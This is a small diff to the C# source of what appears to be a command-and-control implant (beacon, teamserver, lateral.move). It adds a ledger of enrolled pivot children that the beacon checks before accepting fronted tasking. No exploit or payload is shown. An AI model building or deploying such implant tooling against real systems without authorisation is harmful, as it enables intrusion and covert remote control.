@@ -30,6 +30,10 @@ namespace Rod.Implant.Internal;
 /// child token arrives in the lateral.move arguments; the bundle here is the
 /// enroll endpoint, CA pin, transport profile, and the parent's own implant id
 /// (named as the child's parent). A null bundle leaves derivation disabled.
+/// The bundle also carries the fronted-pivot ledger the beacon loop gates
+/// fronted tasking on (architecture.md Sec 5.2): one instance shared between
+/// the lateral.move handler that records each Pivot child and the beacon that
+/// executes its tasking.
 /// </summary>
 internal sealed class EnrollBundle
 {
@@ -41,6 +45,14 @@ internal sealed class EnrollBundle
     /// The teamserver CA(s) to pin at enroll, or null to trust the system roots.
     /// </summary>
     public X509Certificate2Collection? CAs { get; init; }
+
+    /// <summary>
+    /// The Pivot children this implant enrolled (architecture.md Sec 5.2):
+    /// recorded by lateral.move at each Pivot-class derivation, read by the
+    /// beacon loop to accept fronted tasking -- and refuse tasking marked for
+    /// an implant this one never enrolled.
+    /// </summary>
+    public FrontedPivots Fronted { get; } = new();
 }
 
 /// <summary>
